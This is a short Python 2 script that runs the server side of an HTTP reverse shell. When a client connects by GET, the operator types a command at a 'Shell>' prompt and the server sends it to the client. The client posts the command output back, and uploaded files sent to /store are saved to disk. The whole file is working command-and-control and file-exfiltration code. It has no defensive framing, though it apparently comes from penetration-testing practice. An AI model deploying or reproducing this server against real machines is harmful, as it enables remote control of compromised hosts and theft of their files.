import BaseHTTPServer

import os, cgi

HOST_NAME="192.168.1.111" # local values
PORT_NUMBER = 8000

class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):

    # handling GET request -> writing the command and preparing the HTTP reqest
    def do_GET(s):
        command = raw_input("Shell> ") # grab the user input
        s.send_response(200) # sends OK
        s.send_header("Content-Type", "text/html")
        s.end_headers()
        s.wfile.write(command)

    # handling GET request -> reading from client (preparing the HTTP reqest)
    def do_POST(s):
        # detecting the /store
        if s.path == '/store':
            try:
                # getting the content-type
                ct, content = cgi.parse_header(s.headers.getheader('content-type'))
                if ct == 'multipart/form-data': # checking if request comes with multipart
                    fs = cgi.FieldStorage(fp = s.rfile, headers = s.headers, environ= {'REQUEST_METHOD':'POST'}) # using the FStorage class
                else:
                    print("[-] Unexpected POST request")

                # grabbing the file for FieldStorage
                fs_up = fs['file']
                # opening the placeholder for writing (binary)
                with open('./transfer/file', 'wb') as o:
                    o.write(fs_up.file.read()) # writing sentence
                    # closing the request
                    s.send_response(200)
                    s.end_headers()
            except Exception as e:
                print(e)
            return

        s.send_response(200)
        s.end_headers()
        length = int(s.headers['Content-Length']) # length passed and converted to INT
        postVar = s.rfile.read(length)
        print(postVar)

if __name__ == "__main__":
    server_class = BaseHTTPServer.HTTPServer
    # http server object configuration
    httpd = server_class((HOST_NAME, PORT_NUMBER), MyHandler)
    try:
        httpd.serve_forever() # what it says
    except KeyboardInterrupt:
        print("[-] Server is terminated")
        httpd.server_close()
